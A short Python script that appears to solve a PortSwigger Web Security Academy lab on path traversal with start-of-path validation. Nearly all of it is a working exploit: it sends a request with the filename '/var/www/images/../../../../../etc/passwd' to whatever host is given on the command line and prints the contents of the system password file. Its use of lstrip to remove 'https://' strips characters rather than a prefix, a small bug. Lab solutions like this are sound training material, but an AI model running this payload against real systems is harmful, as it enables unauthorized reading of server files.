"""
https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path
"""

import sys
import requests

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

url = f'''https://{site}/image?filename=/var/www/images/../../../../../etc/passwd'''

s = requests.Session()

resp = s.get(url)
print(resp.text)